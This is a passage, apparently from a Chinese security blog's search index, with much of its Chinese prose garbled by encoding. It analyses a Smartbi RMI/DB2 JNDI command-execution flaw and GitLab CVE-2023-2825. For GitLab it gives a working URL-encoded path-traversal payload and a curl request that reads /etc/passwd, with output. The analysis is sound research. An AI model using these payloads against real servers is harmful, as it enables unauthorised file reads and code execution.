request.getSession().getAttribute(\u0026#34;TraceConfig\u0026#34;); if (this.tracedetail \u0026amp;\u0026amp; traceConfig == null) { traceConfig = new TraceConfig(); request.getSession().setAttribute(\u0026#34;TraceConfig\u0026#34;, traceConfig); } RMIInfo rmiInfo = RMIUtil.parseRMIInfo(request, true); String className = rmiInfo == null ? null : rmiInfo.getClassName(); String methodName = rmiInfo == null ? null : rmiInfo.getMethodName(); String params = rmiInfo == null ? null : rmiInfo.getParams(); ... try { String resultStr = processExecute(request, className, methodName, params); RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); ... } } catch (Throwable th) { RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); throw th; } } RMIUtil.parseRMIInfoæ–¹æ³•é¦–å…ˆåˆ¤æ–­uriæ˜¯å¦æ˜¯/vision/RMIServletï¼Œè€Œåè·å–è¯·æ±‚çš„classNameã€methodNameã€paramså‚æ•°ï¼Œå¹¶è¿”å›RMIInfoå¯¹è±¡\npublic static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) { if (!\u0026#34;/vision/RMIServlet\u0026#34;.equals(request.getServletPath()) \u0026amp;\u0026amp; !forceParse) { return null; } RMIInfo info = getRMIInfoFromRequest(request); if (info != null) { return info; } String className = request.getParameter(\u0026#34;className\u0026#34;); String methodName = request.getParameter(\u0026#34;methodName\u0026#34;); String params = request.getParameter(SimpleReportBO.EL_PARAMS); if (StringUtil.isNullOrEmpty(className) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(methodName) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(params) \u0026amp;\u0026amp; request.getContentType() != null \u0026amp;\u0026amp; request.getContentType().startsWith(\u0026#34;multipart/form-data;\u0026#34;)) { DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try { List\u0026lt;FileItem\u0026gt; fileItems = upload.parseRequest(request); request.setAttribute(ATTR_KEY_UPLOAD_FILE_ITEMS, fileItems); for (FileItem fileItem : fileItems) { if (fileItem.isFormField()) { String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(\u0026#34;UTF-8\u0026#34;); if (\u0026#34;className\u0026#34;.equals(itemName)) { className = itemValue; } else if (\u0026#34;methodName\u0026#34;.equals(itemName)) { methodName = itemValue; } else if (SimpleReportBO.EL_PARAMS.equals(itemName)) { params = itemValue; } else if (\u0026#34;encode\u0026#34;.equals(itemName)) { encodeString = itemValue; } } } } catch (FileUploadException | UnsupportedEncodingException e) { LOG.error(e.getMessage(), e); } if (!StringUtil.isNullOrEmpty(encodeString)) { String[] decode = (String[]) CodeEntry.decode(encodeString, true); className = decode[0]; methodName = decode[1]; params = decode[2]; } } if (className == null \u0026amp;\u0026amp; methodName == null) { className = (String) request.getAttribute(\u0026#34;className\u0026#34;); methodName = (String) request.getAttribute(\u0026#34;methodName\u0026#34;); params = (String) request.getAttribute(SimpleReportBO.EL_PARAMS); } RMIInfo info2 = new RMIInfo(); info2.setClassName(className); info2.setMethodName(methodName); info2.setParams(params); request.setAttribute(ATTR_KEY_RMI_INFO, info2); return info2; } è€Œåè°ƒç”¨processExecuteæ–¹æ³•ï¼Œæœ€ç»ˆé€šè¿‡exceptionToNodeæ–¹æ³•é€šè¿‡åå°„è°ƒç”¨äº†å¯¹åº”çš„æ–¹æ³•\npublic String processExecute(HttpServletRequest request, String className, String methodName, String params) { Map\u0026lt;Integer, Integer\u0026gt; map; ClientService service = RMIModule.getInstance().getService(className); ClientService operationFailLogService = RMIModule.getInstance().getService(\u0026#34;OperationLogService\u0026#34;); String resultStr = null; JSONArray jsonParams = null; try { } catch (Exception ce) { if (Framework.getInstance().getExceptionHandler() != null) { return Framework.getInstance().getExceptionHandler().processException(ce); } if (className != null \u0026amp;\u0026amp; methodName != null) { try { ObjectNode resultNode = exceptionToNode(className, methodName, ce); resultStr = resultNode.toString(); String failResult = resultNode.has(\u0026#34;detail\u0026#34;) ? resultNode.get(\u0026#34;detail\u0026#34;).asText((String) null) : null; if (StringUtil.isNullOrEmpty(failResult)) { failResult = resultNode.get(\u0026#34;result\u0026#34;).asText(); } List\u0026lt;Object\u0026gt; listParams = null; if (0 != 0) { listParams = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; jsonParams.length(); i++) { listParams.add(jsonParams.get(i)); } } Object[] objParams = {className, methodName, listParams, failResult}; operationFailLogService.executeInternal(\u0026#34;addOperationFailLog\u0026#34;, objParams); } catch (Exception e) { LOG.error(e.getMessage(), e); } } } public Object executeInternal(String methodName, Object[] objParams) { try { Method method = StringUtil.isNullOrEmpty(methodName) ? null : this.methodList.get(methodName); if (method == null) { throw new SmartbiException(CommonErrorCode.METHOD_NAME_ERROR).setDetail(StringUtil.replaceHTML(methodName)); } Object result = method.invoke(this.module, objParams); return result; } catch (InvocationTargetException ex) { if (ex.getCause() instanceof SmartbiException) { å†æ¥å›é¡¾ä¸€ä¸‹è¡¥ä¸ï¼Œè¡¥ä¸ä¸­è¯´è¯¥æ¼æ´æ˜¯å¯¹é’±ä¸€ä¸ªæ¼æ´çš„ç»•è¿‡ï¼Œç»è¿‡ä¸Šé¢çš„åˆ†æå¯çŸ¥*.stubæ¥å£æ— éœ€èº«ä»½éªŒè¯ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡*.stubæ¥å£åˆ©ç”¨Smartbiå†…çš„åå°„è°ƒç”¨åˆ°å­˜åœ¨æ¼æ´çš„ç±»ã€‚\nåœ¨è¡¥ä¸ä¸­æœ‰å¦‚ä¸‹ï¼Œé€šè¿‡å…¨å±€æœç´¢ç±»åDataSourceServiceä¾¿å¯çŸ¥é“æ¼æ´ä»£ç ã€‚\n\u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;ä¿®å¤äº† DB2 å‘½ä»¤æ‰§è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;ä¿®å¾©äº† DB2 å‘½ä»¤åŸ·è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, è¯¥ä»£ç ä¸­çš„å‚æ•°å‡ä¸ºå¯æ§ï¼Œæ•…å¯ä»¥é€šè¿‡æ§åˆ¶JDBC urlçš„æ–¹å¼æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡DB2æ‰§è¡Œä»£ç ã€‚\npublic void testConnectionList(List\u0026lt;IDataSource\u0026gt; list) { for (IDataSource dataSource : list) { MetaDataServiceImpl.getInstance().testConnection(dataSource); } } public void testConnection(IDataSource dataSource) { int preIndex; ISystemConfig systemConfig; DataSource ds = new DataSource(); String url = dataSource.getUrl(); ds.setId(UUIDGenerator.generate()); ds.setName(dataSource.getName()); ds.setAlias(dataSource.getAlias()); ds.setDriver(dataSource.getDriver()); ds.setDesc(dataSource.getDesc()); ds.setDbCharset(dataSource.getDbCharset()); ds.setUrl(url); ds.setUser(dataSource.getUser()); ds.setDriverType(dataSource.getDriverType()); ds.setMaxConnection(dataSource.getMaxConnection()); ds.setValidationQuery(dataSource.getValidationQuery()); ds.setPassword(dataSource.getPassword()); ds.setTransactionIsolation(dataSource.getTransactionIsolation()); ds.setValidationQueryMethod(dataSource.getValidationQueryMethod()); ds.setAuthenticationType(dataSource.getAuthenticationType()); ds.setExtendProp(dataSource.getExtendProp()); ds.setDriverCatalog(dataSource.getDriverCatalog()); if (dataSource.getPassword() == null \u0026amp;\u0026amp; !StringUtil.isNullOrEmpty(dataSource.getId())) { DataSource dbDs = loadDataSource(dataSource.getId()); ds.setPassword(dbDs.getPassword()); } if (StringUtil.isNullOrEmpty(dataSource.getId()) \u0026amp;\u0026amp; ds.getDriverType() == DBType.HADOOP_HIVE \u0026amp;\u0026amp; (systemConfig = FreeQueryModule.getInstance().getSystemConfigService().getSystemConfig(\u0026#34;MPP_SSH_CONFIG\u0026#34;)) != null) { String longValue = systemConfig.getLongValue(); if (StringUtils.isNotBlank(longValue)) { JSONObject jsonObject = JSONObject.fromString(longValue); if (jsonObject.has(SFTPConstants.HIVE_PASSWORD)) { String pwd = jsonObject.getString(SFTPConstants.HIVE_PASSWORD); if (StringUtils.isNotBlank(pwd)) { ds.setPassword(pwd); } } } } Connection conn = null; try { try { conn = ConnectionPool.getInstance().getConnection(ds); if (conn == null) { throw new SmartbiException(CommonErrorCode.JDBC_DRIVER_ERROR).setDetail(ds.getDriver() + \u0026#34;:\u0026#34; + ds.getUrl()); } if (DBType.PRESTO == dataSource.getDriverType()) { PreparedStatement stat = JdbcUtil.prepareStatement(conn, \u0026#34;SELECT 1\u0026#34;, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), \u0026#34;SELECT 1\u0026#34;)); } catch (Exception e) { if (e instanceof SmartbiException) { throw ((SmartbiException) e); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } else if (DBType.CLICK_HOUSE == dataSource.getDriverType() \u0026amp;\u0026amp; (preIndex = url.indexOf(\u0026#34;clusterName=\u0026#34;)) \u0026gt; -1) { String clusterName = url.substring(preIndex + \u0026#34;clusterName=\u0026#34;.length()); int suffixIndex = clusterName.indexOf(\u0026#34;\u0026amp;\u0026#34;); if (suffixIndex \u0026gt; -1) { clusterName = clusterName.substring(0, suffixIndex); } if (!StringUtil.isNullOrEmpty(clusterName)) { String validSql = \u0026#34;drop table if exists t_testcluster on cluster \u0026#34; + clusterName; PreparedStatement stat2 = JdbcUtil.prepareStatement(conn, validSql, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat2, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), validSql)); } catch (Exception e2) { if (e2.getLocalizedMessage().indexOf(\u0026#34;Requested cluster \u0026#39;\u0026#34; + clusterName + \u0026#34;\u0026#39; not found\u0026#34;) \u0026gt; -1) { throw new SmartbiException(CommonErrorCode.CLICK_HOUSE_CLUSTER_NOT_FOUND, e2).setDetail(clusterName); } if (e2 instanceof SmartbiException) { throw ((SmartbiException) e2); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e2).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } } } catch (Exception e3) { if (e3 instanceof SmartbiException) { throw ((SmartbiException) e3); } String detail = SmartbiXDataSetUtil.OTHER; if (e3 instanceof ClassNotFoundException) { detail = StringUtil.getLanguageValue(\u0026#34;DBDriverNoFound\u0026#34;); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e3).setDetail(detail + e3.getMessage()); } } finally { if (conn != null) { try { conn.close(); } catch (Throwable th) { Logger.getLogger(getClass()).debug(SmartbiXDataSetUtil.OTHER); } } if (!ds.getUrl().startsWith(\u0026#34;JNDI:\u0026#34;)) { ConnectionPool.getInstance().closePool(ds); } } } é¢˜å¤–è¯ï¼Œæˆ‘æœ¬èº«ä¸æ‡‚Javaé‚£ä¸€å¥—ï¼Œåªæ˜¯æŒ‰ç…§ç²—æµ…çš„ä»£ç ç†è§£å»åˆ†ææ¼æ´ï¼Œæœ‰æœºä¼šå»åˆ†æä¸€ä¸‹JNDIæ³¨å…¥åŸç†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.smartbi.com.cn/patchinfo\nCreated at 2023-06-16T16:07:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/","title":"CVE-2023-2825 Gitlab è·¯å¾„ç©¿è¶Šæ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨GitLab ä¸­ï¼Œå½“ä¸€ä¸ªé™„ä»¶å­˜åœ¨äºä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œå¹¶ä¸”è¯¥é¡¹ç›®åœ¨åµŒå¥—äº†è‡³å°‘äº”å±‚çš„ç»„å†…ï¼Œæ”»å‡»è€…æ‰å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚\nå½±å“ç‰ˆæœ¬ GitLab 16.0.0\nç¯å¢ƒæ­å»º ç”¨dockerèµ·ç¯å¢ƒ\ndocker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æ™®é€šçš„ç›®å½•ç©¿è¶Šï¼Œå…ˆdiffçœ‹æ€ä¹ˆä¿®çš„ï¼Œæ³¨æ„åˆ°16.0.1æ–°å¢äº†spec\\support\\shared_examples\\requests\\uploads_actions_shared_examples.rb æ–‡ä»¶ã€‚\næ ¹æ®è¯¥æ–‡ä»¶å†…å®¹åˆ¤æ–­åº”è¯¥æ˜¯è¿™ä¸ªæ¼æ´çš„å•å…ƒæµ‹è¯•æ–‡ä»¶ï¼Œæ²¡å­¦è¿‡rubyï¼Œå…ˆæŠŠè¿™æ®µä»£ç æ‰”ç»™ChatGPTçœ‹çœ‹\n# frozen_string_literal: true RSpec.shared_examples \u0026#39;uploads actions\u0026#39; do describe \u0026#34;GET #show\u0026#34; do context \u0026#39;with file traversal in filename parameter\u0026#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { \u0026#34;../../../../../../../../../Gemfile.lock\u0026#34; } let(:escaped_filename) { CGI.escape filename } it \u0026#39;responds with status 400\u0026#39; do # Check files do indeed exists upload_absolute_path = Pathname(upload.absolute_path) expect(upload_absolute_path).to be_exist attacked_file_path = upload_absolute_path.dirname.join(filename) expect(attacked_file_path).to be_exist # Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches` get show_path.sub(File.basename(upload.path), escaped_filename) expect(response).to have_gitlab_http_status(:bad_request) end end end end ChatGPTå›ç­”ï¼š\nè¿™æ®µRubyä»£ç å®šä¹‰äº†ä¸€ä¸ªRSpecå…±äº«ç¤ºä¾‹ï¼Œåä¸ºâ€œuploads actionsâ€ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹æµ‹è¯•äº†åœ¨æ–‡ä»¶åå‚æ•°ä¸­å‘ç”Ÿæ–‡ä»¶éå†æ”»å‡»æ—¶æœåŠ¡å™¨çš„å“åº”è¡Œä¸ºã€‚ åœ¨æµ‹è¯•ç”¨ä¾‹ä¸­ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸¤ä¸ªå˜é‡ï¼šfilenameå’Œescaped_filenameã€‚filenameå˜é‡æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä»£è¡¨å°†è¢«æ”»å‡»çš„æ–‡ä»¶åã€‚escaped_filenameå˜é‡æ˜¯å¯¹filenameè¿›è¡ŒURLç¼–ç åçš„ç»“æœï¼Œè¿™æ˜¯ä¸ºäº†é¿å…è¯·æ±‚URLä¸­ä½¿ç”¨ä¸å®‰å…¨çš„å­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„ç»“æœã€‚ ç„¶åï¼Œè¯¥æµ‹è¯•ç”¨ä¾‹æ£€æŸ¥ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¹‹åæ„é€ ä¸€ä¸ªæ¶æ„URLè¯·æ±‚æ¥æ‰§è¡Œæ–‡ä»¶éå†æ”»å‡»ï¼Œè¯·æ±‚ä¸€ä¸ªéæ³•æ–‡ä»¶ã€‚å…·ä½“è€Œè¨€ï¼Œå®ƒä½¿ç”¨Pathnameç±»æ¥è·å–ä¸Šä¼ æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç„¶åä½¿ç”¨File.basenameå’ŒString#subæ–¹æ³•æ¥æ„é€ æ¶æ„URLè¯·æ±‚ã€‚æœ€åï¼Œä½¿ç”¨RSpecçš„expectè¯­å¥æ¥æ£€æŸ¥æœåŠ¡å™¨çš„å“åº”çŠ¶æ€ç æ˜¯å¦ä¸º400ï¼ˆbad_requestï¼‰ã€‚ æ€»ä¹‹ï¼Œè¿™ä¸ªRSpecå…±äº«ç¤ºä¾‹æµ‹è¯•äº†æœåŠ¡å™¨æ˜¯å¦èƒ½å¤Ÿé˜²æ­¢æ–‡ä»¶éå†æ”»å‡»ï¼Œå¹¶æ­£ç¡®åœ°å¤„ç†æ¶æ„è¯·æ±‚ã€‚ æ ¹æ®æœ‰é™çš„çŸ¥è¯†ç»“åˆChatGPTå›ç­”ï¼Œå¯ä»¥çŸ¥é“è¿™æ®µä»£ç é¦–å…ˆå®šä¹‰äº†ç›®å½•ç©¿è¶Šçš„payloadï¼š../../../../../../../../../Gemfile.lock è€Œåå°†å…¶è¿›è¡Œurlç¼–ç å¹¶èµ‹å€¼ç»™escaped_filenameã€‚\nä¹‹åå°†ä¸Šä¼ ç›®å½•çš„è·¯å¾„å’Œè¿™ä¸ªpayloadæ‹¼æ¥å¹¶åˆ¤æ–­è¿™ä¸ªè·¯å¾„æ˜¯å¦å­˜åœ¨ã€‚ä¹‹åé€šè¿‡String.subå‡½æ•°å°†ä¸Šä¼ è·¯å¾„çš„æ–‡ä»¶åæ›¿æ¢æˆäº†escaped_filenameï¼Œå¹¶ç”¨RSpec æ¡†æ¶çš„getå‡½æ•°å‘èµ·è¯·æ±‚ã€‚\nç»“åˆè¯¥å•å…ƒæµ‹è¯•çš„æ³¨é‡Šï¼Œå¯ä»¥çŸ¥é“ï¼Œå¤§æ¦‚payloadå¦‚ä¸‹\n/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET åœ¨é€šè¿‡å®˜æ–¹æ–‡æ¡£çŸ¥é“å¦‚ä½•é€šè¿‡APIä¸Šä¼ é™„ä»¶\ncurl --request POST --header \u0026#34;PRIVATE-TOKEN: \u0026lt;your_access_token\u0026gt;\u0026#34; \\ --form \u0026#34;file=@dk.png\u0026#34; \u0026#34;https://gitlab.example.com/api/v4/projects/5/uploads\u0026#34; https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file\nè¿™é‡Œå…ˆç”¨Administratorä¸Šä¼ ä¸€ä¸ªé™„ä»¶çœ‹çœ‹ï¼ˆå·²æå‰å»ºå¥½ç›¸åº”çš„ç»„å’Œé¡¹ç›®ï¼‰\n$ curl --request POST --header \u0026#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR\u0026#34; --form \u0026#34;file=@3.txt\u0026#34; \u0026#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads\u0026#34; {\u0026#34;alt\u0026#34;:\u0026#34;3.txt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt\u0026#34;,\u0026#34;full_pat h\u0026#34;:\u0026#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx t\u0026#34;,\u0026#34;markdown\u0026#34;:\u0026#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)\u0026#34;} å¯ä»¥çœ‹åˆ°å·²ç»è¿”å›äº†ä¸€ä¸ªurlï¼Œä¸éš¾çœ‹å‡ºå’Œå•å…ƒæµ‹è¯•é‡Œé¢çš„æ³¨é‡Šçš„è·¯å¾„é•¿å¾—å¾ˆåƒï¼Œè¿™é‡Œç”¨è‡ªå·±çš„payloadæ›¿æ¢3.txt\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh åˆ†æ\nåˆ°ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜\nä¸ºä»€ä¹ˆè¦æ±‚payloadéœ€è¦ç»è¿‡urlç¼–ç  ä¸ºä»€ä¹ˆè¦12ä¸ªç©¿è¶Šç¬¦æ‰èƒ½åˆ°æ ¹ç›®å½• åœ¨å“ªä¸ªä»£ç è§¦å‘çš„æ¼æ´ é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒGitLabæ¶æ„ä¸ºnginx â†”Workhorseâ†”pumaï¼Œèµ·åˆä»¥ä¸ºå°†ç›®å½•ç©¿è¶Šè¿›è¡Œurlç¼–ç æ˜¯ç»•è¿‡nginxè§£æï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå½“è®¿é—®/1/2/3/4/5/6/../../../index.phpæ—¶nginxå®é™…ä¼šè®¿é—®/1/2/3/index.phpï¼Œå³ä¼šè¿›è¡Œæ‹¼æ¥ç„¶åè®¿é—®ï¼Œæ‰€ä»¥ä¸€å¼€å§‹åˆ¤æ–­çš„æ˜¯å°†payloadè¿›è¡Œurlç¼–ç ç»•è¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œè€Œåå’Œå…¶ä»–å¸ˆå‚…è®¨è®ºæ‰å‘ç°ï¼Œè™½ç„¶å°†payloadè¿›è¡Œç¼–ç ä½†nginxä¼šå°†urlé‡Œé¢urlç¼–ç çš„éƒ¨åˆ†è¿›è¡Œè§£ç ç„¶åæ‹¼æ¥ï¼Œæ‰€ä»¥urlç¼–ç ä¸æ˜¯ä¸ºäº†ç»•è¿‡nginxè§£æã€‚åœ¨å‰é¢ä½¿ç”¨apiä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæ–‡æ¡£ç‰¹åˆ«å¼ºè°ƒäº†ä¸Šä¼ ç›®æ ‡è·¯å¾„éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œè¿™é‡Œæ¨æµ‹åº”è¯¥æ˜¯GitLabå†…ä¼šè¿›è¡Œurlè§£ç åœ¨è¿›è¡Œå¤„ç†ã€‚\nç¬¬äºŒä¸ªé—®é¢˜ä¸ºä»€ä¹ˆéœ€è¦12ä¸ªç©¿è¶Šç¬¦ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ–‡ä»¶å®é™…ä¸Šä¼ åœ¨/var/opt/gitlab/gitlab-rails/uploads/@hashed ç›®å½•ä¸‹ï¼Œä½†åœ¨ä»£ç ä¸­ä½¿ç”¨çš„æ˜¯/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/ å…¶ä¸­uploadsè½¯è¿æ¥åˆ°äº†/var/opt/gitlab/gitlab-rails/uploadsç›®å½•ï¼Œåœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åï¼Œæ–‡ä»¶è·¯å¾„ä¸º/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt ä¸éš¾çœ‹å‡ºå…±æœ‰12å±‚ç›®å½•æ‰€ä»¥éœ€è¦12ä¸ªç©¿è¶Šç¬¦ï¼Œåœ¨è§¦å‘æ¼æ´æ—¶urlä¸º/path/to/group/project/uploads/@hashedï¼Œç»“åˆç»•è¿‡nginxè§£æï¼Œæ‰€ä»¥è‡³å°‘éœ€è¦9ä¸ªç»„æ‰èƒ½æœ‰è¶³å¤Ÿçš„åµŒå¥—å±‚æ•°ç»•è¿‡nginxçš„urlè§£æã€‚\nç¬¬ä¸‰ä¸ªé—®é¢˜ï¼Œå›åˆ°è¡¥ä¸å¯¹æ¯”ï¼Œè¡¥ä¸ä¸»è¦åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶æ·»åŠ äº†é˜²æŠ¤ç›®å½•ç©¿è¶Šçš„ä»£ç ï¼Œåœ¨showæ–¹æ³•å¤„å¯¹filenameè¿›è¡Œurlè§£ç è€Œåè°ƒç”¨ Gitlab::Utils.check_path_traversal!(params[:filename]) æ£€æŸ¥urlè§£ç åçš„å‚æ•°æ˜¯å¦å­˜åœ¨ç›®å½•ç©¿è¶Šã€‚\napp\\uploaders\\object_storage.rb def retrieve_from_store!(identifier) Gitlab::Utils.check_path_traversal!(identifier) # We need to force assign the value of @filename so that we will still # get the original_filename in cases wherein the file points to a random generated # path format. This happens for direct uploaded files to final location. # # If we don\u0026#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result # to the value of uploader.file.filename which will then contain the random generated path. # The `identifier` variable contains the value of the `file` column which is the original_filename. # # In cases wherein we are not uploading to final location, it is still fine to set the # @filename with the `identifier` value because it still contains the original filename from the `file` column, # which is what we want in either case. @filename = identifier # rubocop: disable Gitlab/ModuleWithInstanceVariables super end private app\\controllers\\concerns\\uploads_actions.rb def show Gitlab::Utils.check_path_traversal!(params[:filename]) return render_404 unless uploader\u0026amp;.exists? ttl, directives = *cache_settings ttl ||= 0 directives ||= { private: true, must_revalidate: true } expires_in ttl, directives file_uploader = [uploader, *uploader.versions.values].find do |version| version.filename == params[:filename] end return render_404 unless file_uploader workhorse_set_content_type! send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition) end å†æ¥çœ‹Gitlab::Utils.check_path_traversalå‡½æ•°ï¼Œå…¶å®šä¹‰åœ¨lib\\gitlab\\utils.rb\ndef check_path_traversal!(path) return unless path path = path.to_s if path.is_a?(Gitlab::HashedPath) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; unless path.is_a?(String) path = decode_path(path) path_regex = %r{(\\A(\\.{1,2})\\z|\\A\\.\\.[/\\\\]|[/\\\\]\\.\\.\\z|[/\\\\]\\.\\.[/\\\\]|\\n)} if path.match?(path_regex) logger.warn(message: \u0026#34;Potential path traversal attempt detected\u0026#34;, path: \u0026#34;#{path}\u0026#34;) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; end path end 